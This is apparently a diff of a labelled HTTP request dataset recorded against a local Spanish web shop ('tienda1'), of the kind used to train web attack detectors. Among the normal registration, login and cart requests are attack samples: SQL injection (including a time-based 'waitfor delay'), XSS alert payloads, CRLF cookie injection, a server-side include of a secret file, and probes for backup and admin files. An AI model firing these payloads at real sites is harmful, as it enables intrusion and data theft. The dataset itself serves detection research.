-GET http://localhost:8080/tienda1.INC HTTP/1.1
-GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
-GET http://localhost:8080/tienda1/publico/registro.jsp?modo=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=maudie&password=cegaTo%3Fso&nombre=Yured&apellidos=Modrego+Aylagas&email=natzler.machiavelli%40francislucille.cy&dni=68096192T&direccion=C%2F+Carlos+De+La+Rica%2C+8+11%3FA&ciudad=Puigverd+d%27Agramunt&cp=08672&provincia=Palencia&ntc=6396253761051262&B1=Registrar HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ginsberg&pwd=s33ler%271&remember=on&B1=Entrar HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=anand&password=potroso&nombre=Eduviges&apellidos=Esta%F1ol+Bellet&email=verdier%40zaya.name&dni=62258107M&direccion=C%2F+San+Pablo+130%2C+8H&ciudad=V%EDznar&cp=50140&provincia=Alicante&ntc=2780139956948714&B1=Registrar
-GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
-POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito
-GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dyment&password=Z5R1174oSa&nombre=Sadoc&apellidos=Oruna&email=lewwis.mall%40epbx.pg&dni=62162273N&direccion=C%2F+Veinat+De+Cerdanyola%2C+3+6E&ciudad=Tagamanent&cp=09133&provincia=Le%F3n&ntc=3798715775380607&B1=Registrar HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=prestipi&password=trinar&nombre=Sulamita&apellidos=Serrat&email=warbeck%40tabernarinconete.tz&dni=52485262K&direccion=Calle+Monges%2C+28%2C+3-F&ciudad=Banyalbufar&cpA=05292&provincia=Zamora&ntc=5196721943648454&B1=Registrar
-GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=yoonmo2&pwd=azo5da&remember=on%2F&B1=Entrar HTTP/1.1
-POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=4021&B1=Confirmar
-GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
-GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
-GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=79&B1=A%F1adir+al+carrito
-POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Vino+Rioja&precioA=100&cantidad=21&B1=A%F1adir+al+carrito
-POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=%2B
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=3714&B1=Confirmar HTTP/1.1
-GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
-GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif HTTP/1.1
 GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
-POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=winnie&password=1ArZ5ElA&nombre=Pomponio&apellidos=Aboitiz+Monestel&email=mcnaughton%40queinvento.gg%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&dni=86852947W&direccion=Calle+Gerardo+Rueda%2C+68%2C+3%3FC&ciudad=Foradada&cp=43411&provincia=Badajoz&ntc=4587587495208642&B1=Registrar
-GET http://localhost:8080/tienda1/global/titulo.jsp.Inc HTTP/1.1
-GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7896&B1=Pasar+por+caja HTTP/1.1
-POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=nitin&password=r4mitir&nombre=Lionel&apellidos=Teixidor+Modrego&email=creach%40vindexexpo.gr&dniA=37118814B&direccion=C%2F+Joaquin+Arjona+70%2C+&ciudad=Rionegro+del+Puente&cp=49639&provincia=Barcelona&ntc=8651464575981410&B1=Registrar
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=stalin&password=calaba1ear&nombre=Florestano&apellidos=Sams%F3+Agea&email=marsdon%40hrmsl.cn&dni=37618946P&direccion=Motril%2C+131+&ciudad=Guillena&cp=26325&provincia=Badajoz&ntc=2781714156257998&B1=Registrar
+GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modoA=entrar&login=vivianne7&pwd=adu3%F3n&remember=on&B1=Entrar
+GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1
+POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidos=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=60B999025N&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar
+GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=32&B1=A%F1adir+al+carrito
 POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas
-GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
-POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=cis_w&password=H3RetiCal&nombre=Alcia&apellidos=Escarr%E9+Adrover&email=malik%40clubdeviaje.so&dni=61530852X&direccion=San+Jose+32%2C+&ciudad=Arano&cp=31579&provincia=V.alenc%3Fia&ntc=8422181884729126&B1=Registrar
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=79&B1=A%F1adir+al+carrito
+GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
+POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=underwoo&password=desportilladura&nombre=Alide&apellidos=Ezama+Ogaz&email=quan%40arroyo-molinos.ee&dni=52948186R&direccion=El+Naranjo%2C+S%2FN+5F&ciudad=Eliana%2C+l%27&cp=34112&provincia=Le%F3n&ntc=5244748375620408&B1=Registrar
+GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=%2520&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/ HTTP/1.1
+GET http://localhost:8080/tienda1/index.jsp HTTP/1.1
+POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=100&cantidadA=13&B1=A%F1adir+al+carrito
+GET http://localhost:8080/iisstart.asp HTTP/1.1
+GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
+POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=4021&B1=Confirmar
+GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1
+POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=%27+AND+%271%27%3D%271&login=cinderel&password=rel%2Bigionario&nombre=Kenneth&apellidos=Hijodalgo+Formiga&email=gil-botelho%40miami-beach.com.info&dni=81551229Z&direccion=El+Arquero%2C+143%2C+1%3FD&ciudad=Amurrio&cp=37170&provincia=Segovia&ntc=8326601768414043&B1=Registrar
+GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
+POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=mullinix&password=portadguero&nombre=Nanda&apellidos=Santagata+Pillajo&email=wakasa%40miami-beach.gf&dni=44636251J&direccion=C%2F+Perro+De+San+Cecilio%2C+197+11%3FA&ciudad=Cerro+de+And%E9valo%2C+El&cp=19275&provincia=Guadalaja%2Fra&ntc=5604259372572557&B1=Registrar
+GET http://localhost:8080/tienda1/publico/registro.jsp?modo=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=maudie&password=cegaTo%3Fso&nombre=Yured&apellidos=Modrego+Aylagas&email=natzler.machiavelli%40francislucille.cy&dni=68096192T&direccion=C%2F+Carlos+De+La+Rica%2C+8+11%3FA&ciudad=Puigverd+d%27Agramunt&cp=08672&provincia=Palencia&ntc=6396253761051262&B1=Registrar HTTP/1.1
+GET http://localhost:8080/CFIDE/administrator/login.cfm HTTP/1.1
+GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kwangchi&pwd=73spoJador&remember=off&B1=Entrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6471&B1=Pasar+por+caja%2F HTTP/1.1
+GET http://localhost:8080.Old HTTP/1.1
+GET http://localhost:8080/tienda1/publico/productos.jsp.Bak HTTP/1.1
+POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertarparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=8145&B1=Confirmar
+GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
+POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas
+GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1
 GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=teodoro&password=b9h%FA4a&nombre=Meliano&apellidos=Leiro+Bald%ED&email=miric%40deuxmanagement.an&dni=09475421L&direccion=Calle+Cuevas+Del+Siete+34+&ciudadA=Calzada+de+Don+Diego&cp=16708&provincia=Burgos&ntc=8487233269433512&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dyment&password=Z5R1174oSa&nombre=Sadoc&apellidos=Oruna&email=lewwis.mall%40epbx.pg&dni=62162273N&direccion=C%2F+Veinat+De+Cerdanyola%2C+3+6E&ciudad=Tagamanent&cp=09133&provincia=Le%F3n&ntc=3798715775380607&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1
+POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=velasque9&pwd=adversario&remember=on&B1=Entrar
+GET http://localhost:8080/tienda1/global/creditos.jsp/6909030637832563290.jsp HTTP/1.1
+GET http://localhost:8080/samples/sampsite/sampsite.htm HTTP/1.1
+GET http://localhost:8080/tienda1/publico/registro.jsp?modoA=registro&login=hyatt&password=8c75ps8s&nombre=Raimundo&apellidos=Trave+Girard&email=graef%40softwaremasservicio.is&dni=70803791Q&direccion=Carrer+N%BA++224+S%2FN%2C+3C&ciudad=Cervera+del+Maestre&cp=09390&provincia=Ciudad+Real&ntc=0093197595343977&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=d%3Frieka&password=se8i06c9l&nombre=Valiente&apellidos=Yomona+Noda&email=oberon%4023horas.kz&dni=73353905M&direccion=Calle+Assalt%2C+120+&ciudad=Aznalc%E1zar&cp=49120&provincia=Burgos&ntc=6920842539231486&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidosA=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar HTTP/1.1
+GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7896&B1=Pasar+por+caja HTTP/1.1
+GET http://localhost:8080/tienda1/asf-logo-wide.gif/ HTTP/1.1
+POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=winnie&password=1ArZ5ElA&nombre=Pomponio&apellidos=Aboitiz+Monestel&email=mcnaughton%40queinvento.gg%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&dni=86852947W&direccion=Calle+Gerardo+Rueda%2C+68%2C+3%3FC&ciudad=Foradada&cp=43411&provincia=Badajoz&ntc=4587587495208642&B1=Registrar
+GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
+GET http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.bak HTTP/1.1
+GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=81&B1=A%F1adir+al+carrito HTTP/1.1
